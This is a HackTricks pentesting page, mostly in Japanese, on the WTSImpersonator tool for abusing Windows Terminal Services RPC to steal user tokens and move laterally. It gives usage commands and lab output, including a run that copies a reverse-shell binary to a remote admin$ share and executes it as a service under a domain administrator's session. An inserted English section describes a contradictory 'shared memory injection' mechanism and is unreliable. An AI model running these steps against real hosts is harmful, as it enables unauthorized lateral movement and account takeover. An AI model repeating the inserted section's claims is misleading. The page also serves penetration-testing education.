<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

WTS Impersonatorは、通常の「Token Impersonation技術」を使用せずに、ユーザーの列挙と他のユーザーのトークンの盗難を行うために「**\\pipe\LSM_API_service**」RPC Named pipeを悪用します。これにより、ステルス性を保ちながら簡単に横方向移動ができます。この技術は、[Omri Baso](https://www.linkedin.com/in/omri-baso/)によって研究・開発されました。

`WTSImpersonator`ツールは[github](https://github.com/OmriBaso/WTSImpersonator)で見つけることができます。
```
WTSEnumerateSessionsA → WTSQuerySessionInformationA -> WTSQueryUserToken -> CreateProcessAsUserW
```
#### `enum` モジュール:

ツールが実行されているマシン上のローカルユーザーを列挙します。
```powershell
.\WTSImpersonator.exe -m enum
```
リモートでIPまたはホスト名を指定してマシンを列挙します。
```powershell  
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```
#### `exec` / `exec-remote` モジュール:
"exec" と "exec-remote" の両方は **"Service"** コンテキストで実行する必要があります。
ローカルの "exec" モジュールは、WTSImpersonator.exe と実行したいバイナリ \(-c フラグ\) だけが必要です。これは通常の "C:\\Windows\\System32\\cmd.exe" であり、指定したユーザーとして CMD を開くことができます。以下は例です。
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
以下の手順で、サービスコンテキストを取得するためにPsExec64.exeを使用することができます。

1. PsExec64.exeをダウンロードして実行します。
2. コマンドプロンプトを開き、以下のコマンドを入力します。

```
PsExec64.exe -i -s cmd.exe
```

3. Enterキーを押してコマンドを実行します。
4. 新しいコマンドプロンプトが開き、サービスコンテキストで実行されていることが確認できます。

これにより、サービスコンテキストでの操作が可能になります。
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```
`exec-remote`に関しては、少し異なる方法があります。私は、`PsExec.exe`と同様にリモートでインストールできるサービスを作成しました。
このサービスは、`SessionId`と実行する`バイナリ`を引数として受け取り、適切な権限を持ってリモートでインストールおよび実行されます。
以下は、実行例です：
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m enum -s 192.168.40.129

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso
WTSEnumerateSessions count: 1
[2] SessionId: 2 State: WTSDisconnected (4) WinstationName: ''
WTSUserName:  Administrator
WTSDomainName: LABS
WTSConnectState: 4 (WTSDisconnected)
```
上記のように、管理者アカウントの`Sessionid`は`2`ですので、リモートでコードを実行する際に`id`変数に使用します。
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```
#### `user-hunter` モジュール:

ユーザーハンターモジュールは、複数のマシンを列挙し、指定されたユーザーが見つかった場合、そのユーザーの代わりにコードを実行する能力を提供します。
これは、いくつかのマシンでローカル管理者権限を持ちながら、「ドメイン管理者」を探す際に役立ちます。
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
# WTS Impersonator

The WTS Impersonator technique allows an attacker to steal user credentials by impersonating a Windows Terminal Server (WTS) session.

## Description

When a user logs into a Windows Terminal Server, a session is created for that user. This session is managed by the Windows Terminal Services (WTS) service. The WTS Impersonator technique takes advantage of the fact that the WTS service uses a shared memory section to store session information, including user credentials.

By injecting malicious code into the WTS shared memory section, an attacker can intercept and steal user credentials as they are being processed by the WTS service. This allows the attacker to gain unauthorized access to the user's account and potentially escalate their privileges.

## Steps

1. Identify the target Windows Terminal Server and the user whose credentials you want to steal.

2. Use a tool like `wtsimpersonator.exe` to inject malicious code into the WTS shared memory section.

3. The malicious code should be designed to intercept and capture user credentials as they are being processed by the WTS service.

4. Once the user credentials have been captured, they can be exfiltrated to the attacker's remote server for further analysis.

## Mitigation

To mitigate the risk of WTS Impersonator attacks, consider the following measures:

- Regularly update and patch the Windows Terminal Server to ensure that known vulnerabilities are addressed.

- Implement strong access controls and authentication mechanisms to prevent unauthorized access to the WTS service.

- Monitor the WTS service for any suspicious activity or unauthorized access attempts.

- Educate users about the risks of phishing attacks and the importance of not sharing their credentials with anyone.

- Use multi-factor authentication (MFA) to add an extra layer of security to user accounts.

By implementing these measures, you can significantly reduce the risk of WTS Impersonator attacks and protect user credentials from being stolen.
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m user-hunter -uh LABS/Administrator -ipl .\test.txt -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso

[+] Hunting for: LABS/Administrator On list: .\test.txt
[-] Trying: 192.168.40.131
[+] Opned WTS Handle: 192.168.40.131
[-] Trying: 192.168.40.129
[+] Opned WTS Handle: 192.168.40.129

----------------------------------------
[+] Found User: LABS/Administrator On Server: 192.168.40.129
[+] Getting Code Execution as: LABS/Administrator
[+] Trying to execute remotly
[+] Transfering file remotely from: .\WTSService.exe To: \\192.168.40.129\admin$\voli.exe
[+] Transfering file remotely from: .\SimpleReverseShellExample.exe To: \\192.168.40.129\admin$\DrkSIM.exe
[+] Successfully transfered file!
[+] Successfully transfered file!
[+] Sucessfully Transferred Both Files
[+] Will Create Service voli
[+] Create Service Success : "C:\Windows\voli.exe" 2 C:\Windows\DrkSIM.exe
[+] OpenService Success!
[+] Started Sevice Sucessfully!

[+] Deleted Service
```

